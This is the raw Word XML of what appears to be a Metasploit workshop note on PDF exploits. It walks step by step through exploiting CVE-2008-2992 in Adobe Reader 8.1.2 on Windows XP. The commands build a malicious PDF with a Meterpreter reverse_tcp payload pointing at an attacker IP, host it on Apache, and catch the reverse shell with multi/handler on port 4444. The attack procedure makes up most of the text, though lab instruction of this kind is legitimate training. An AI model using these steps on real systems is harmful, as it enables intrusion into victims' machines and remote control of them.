        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009F5B33">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:bidi="or-IN"/>
        </w:rPr>
        <w:t>Automation (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009F5B33">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:bidi="or-IN"/>
        </w:rPr>
        <w:t>AutoRunScript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009F5B33">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:bidi="or-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009F5B33">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:bidi="or-IN"/>
        </w:rPr>
        <w:t>PrependMigrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009F5B33">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:bidi="or-IN"/>
        </w:rPr>
        <w:t>) ensures session reliability in real-world attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">PDF Exploits – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Workshop Note</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🔍</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Objective:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To exploit a vulnerable version of Adobe Reader using a crafted PDF file and gain a reverse shell session via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r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Background:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Target</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Windows XP SP3 with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>Adobe Reader 8.1.2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Vulnerability</w:t>
      </w:r>
      <w:r>
        <w:t>: CVE-2008-2992</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Exploit Module</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>exploit/windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>fileformat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>adobe_utilprintf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Attack Type</w:t>
      </w:r>
      <w:r>
        <w:t>: Client-side (no direct network target)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2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Steps to Exploit:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🛠</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 1: Launch </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B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msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🧰</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 2: Use the Exploit Module</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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use</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit/windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>fileformat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adobe_utilprintf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>📝</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 3: Set the Filename (optional)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> FILENAME malicious.pdf   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-comment"/>
        </w:rPr>
        <w:t># Default: msf.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>💣</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 4: Set the Payload (optional)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> PAYLOAD windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>meterpreter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reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🌐</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 5: Set LHOST</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> LHOST &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>your_attacker_IP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>🚀</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 6: Generate the Malicious PDF</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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exploit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Output file is saved in: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>/root/.msf4/local/msf.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3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Serve the PDF File</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>💾</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 7: Copy the file to Apache web server directory</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B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builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>cp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> /root/.msf4/local/msf.pdf /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>/www/html/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🔥</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 8: Start Apache Server</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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service</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> apache2 start</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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File is now accessible at: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>http://&lt;attacker_IP&gt;/msf.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1038" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4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Set Up the Payload Handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🔁</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Step 9: Use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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use</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit/multi/handler</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> PAYLOAD windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>meterpreter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reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> LHOST &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>your_attacker_IP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> LPORT 4444</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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exploit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Make sure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>no other handler</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is using port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>4444</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1039" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5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Exploit Execution</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Open </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>msf.pdf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>Adobe Reader 8.1.2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the Windows XP machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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If successful, a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t xml:space="preserve"> session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is created.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
